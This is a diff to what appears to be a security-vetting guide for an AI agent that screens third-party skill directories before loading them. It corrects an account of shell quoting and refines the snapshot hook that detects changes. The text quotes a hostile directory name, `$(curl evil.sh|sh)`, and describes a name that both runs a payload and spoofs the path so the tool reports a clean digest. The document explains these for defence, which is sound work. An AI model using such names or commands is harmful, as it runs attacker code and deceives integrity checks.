@@ -133,8 +133,11 @@ Write one of: **SAFE-TO-PROPOSE / SUSPECT / BLOCK**, with the evidence behind it
   name like `$(curl evil.sh|sh)` or ``x`id` `` is legal. Substituting such a name
   into a shell command RUNS it, at your privilege, before you have read one byte
   of the candidate. **Quoting does not fix this.** An earlier revision of this
-  file claimed double quotes stopped it; they stop `;` and nothing else — not
-  `$(...)`, not backticks, not `${...}`, not an embedded `"`. Worse, a name of
+  file claimed double quotes stopped it. They stop a great deal — inside `"..."`
+  the shell drops the special meaning of `;`, `|`, `&`, `<`, `>`, `(`, `)`,
+  glob characters and whitespace — but NOT the four that matter here: `$`,
+  a backtick, a backslash, and a `"` that closes the quoting. So `$(...)`,
+  `` `...` ``, `${...}` and an embedded `"` all still fire. Worse, a name of
   the form `$(payload; echo other-skill)` both runs the payload AND rewrites the
   path to `other-skill`, so the tool then reports a clean digest for a directory
   you never looked at.
@@ -197,8 +200,11 @@ detects complete skill-tree changes and requires full skill vetting against the
 exact content snapshot before trust or reuse of a cached verdict. Its observation
 layer is the same `hooks/skill_snapshot.py` primitive §3 binds verdicts with
 (one canonical digest for the hook, the verdict record, and the tests), snapshotting
-EVERY file - so an add / modify / delete / rename / symlink / filetype change
-anywhere, not just in `SKILL.md`, registers - and treating whatever it cannot
+EVERY file inside each candidate - so an add / modify / delete / rename /
+symlink / filetype change anywhere in one, not just in its `SKILL.md`,
+registers. (One carve-out, the same one the threat model states under G1: a
+loose regular FILE sitting directly in the skills root is not a candidate at
+all, because it is not loadable as a skill) - and treating whatever it cannot
 fully observe (read errors, oversize files, budget breaches — including every
 candidate enumerated after the budget ran out, any symlink, special
 files, a hostile TOP-LEVEL skill name — nested names are not gated, since they
